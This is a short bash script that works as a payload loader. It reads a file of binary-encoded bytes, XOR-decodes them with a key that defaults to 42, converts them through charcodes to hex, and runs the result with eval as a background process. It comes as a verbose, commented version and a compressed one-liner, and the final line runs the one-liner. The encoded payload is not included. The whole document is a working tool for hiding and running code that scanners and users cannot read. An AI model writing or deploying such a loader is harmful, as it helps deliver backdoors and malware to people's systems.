#!/bin/bash

deobfBd() {
    # Get the contents of the binary file, which is the payload.
    Binary="$(cat "${1}")"

    # The XOR key used to encrypt the payload.
    # If "${2}" is empty, or has a value less than 1, then use the default vaolume of 42 for the XOR key. Otherwise, use the value of "${2}" as the XOR key.
    if [[ -z "${2}" ]] || [[ "${2}" -lt 1 ]]; then
        local xorKey=42
    else
        local xorKey="${2}"
    fi

    # Colors for output
    RED='\033[0;31m'
    NC='\033[0m' # No Color

    # XOR function using a bitwise XOR operation.
    xor(){
        xorKey="$1"
        shift
        R=""
        for i in $@; do
            # Xor the decimal with the XOR key. Bitwise XOR operation.
            R="$R "$(($i^$xorKey))""
        done
        # Return the result.
        echo "$R"
    }

    # Output the binary to show the contents of the binary file.
    printf "${RED}Binary:${NC} ${Binary}\n"

    # Convert the binary to Xor-ed decimal.
    XorDecimal="$(for a in ${Binary} ; do printf "%x" $((2#$a)); done | xxd -r -p)"
    printf "${RED}XOR Decimal:${NC} ${XorDecimal}\n"

    # Convert the Xor-ed decimal to decimal.
    Decimal="$(xor ${xorKey} "${XorDecimal}" | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"
    printf "${RED}Decimal:${NC} ${Decimal}\n"

    # Convert the decimal to charcode.
    Charcode="$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<"${Decimal}")"
    printf "${RED}Charcode:${NC} ${Charcode}\n"

    # Convert the charcode to hex.
    Hex="$(sed 's/;/\n/g' <<<"${Charcode}" | sed '/^$/d' | sed 's/^0x//g' | xargs -I{} printf "\\x{}")"
    printf "${RED}Hex:${NC}";echo "${Hex}"

    # Convert the hex to plain text. This is not needed, only here for demonstration purposes. Eval can read the hex code as a string and execute it as a command.
    PlainText="$(echo -e "${Hex}")"
    printf "${RED}PlainText:${NC} ${PlainText}\n"

    # Run the hex code as a command. This will execute the payload. Eval can read the hex code as a string and execute it as a command. The "&" at the end of the command will run the command in the background.
    eval $"$(echo -e "${Hex}")" &
}

# This function is a slimmed down version of the above function. It does not include the intermediate steps.
deobfBdSlim() {
    x(){ K=$1;shift;R="";for i in $@; do R="$R $(($i^$K))";done;echo "$R";}
    eval $"$(echo -e "$(sed 's/;/\n/g' <<<"$(awk '{for (i=1; i<=NF; i++) printf "%c", $i}'<<<\
    "$(x "${2}" "$(for a in $(cat "${1}");do printf "%x" $((2#$a));done|xxd -r -p)"\
    |sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')")"|sed '/^$/d'|sed 's/^0x//g'|xargs -I{} printf "\\x{}")")" &
}


# deobfBd "${1}" "42"
deobfBdSlim "${1}" "42"

